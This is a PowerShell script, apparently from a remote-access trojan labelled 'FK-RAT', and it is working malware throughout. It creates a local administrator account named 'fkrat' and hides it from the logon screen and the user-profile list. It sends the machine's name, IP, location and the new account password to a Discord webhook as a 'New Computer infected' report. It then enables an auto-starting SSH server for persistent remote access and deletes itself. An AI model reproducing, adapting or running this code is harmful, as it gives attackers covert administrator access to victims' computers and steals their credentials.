## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}
word

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Write-Verbose "$uName local user crated"
    Add-LocalGroupMember -Group "$group" -Member "$uName"
    Write-Verbose "$uName added to the local administrator group"
  }
  end{
  }
}

## Sends Infos to Discord Webhook
function upload_discord {

  [CmdletBinding()]
  param (
      [parameter(Position=0,Mandatory=$False)]
      [string]$file,
      [parameter(Position=1,Mandatory=$False)]
      [string]$text 
  )

  
  $Body = @{
    'username' = $env:username
    'content' = $text
  }
  
  if (-not ([string]::IsNullOrEmpty($text))){
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $Webhook  -Method Post -Body ($Body | ConvertTo-Json)};
  
  if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $Webhook}
  }

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText
$ip = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
$pWord = randomText
$uName = "fkrat"
$pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
$Webhook = Get-Content ./webhook
$language = (Get-WinUserLanguageList)[0].autonym
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)
$description = 
"
New Computer infected 
---------------------------------
Computer Name =       $env:computername 
Computer Language =   $language
Location (country) =  $country
IP =                  $ip
Account Password =    $pword
"
New-Item ./$env:computername.fk -Value (
  $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
)
$payload = [PSCustomObject]@{content=$description}

## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide FK-RAT User (Admin)
New-Item -Path $rPath -Force
New-ItemProperty -Path $rPath -Name $uName -Value 00000000
Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}

## Sends Discord Webhook
Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
upload_discord("$env:computername.fk")


## goto Temp and make dir 
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

pause

## Self Delete
Remove-Item webhook
Remove-Item "$env:computername.fk"
Remove-Item $PSCommandPath -Force 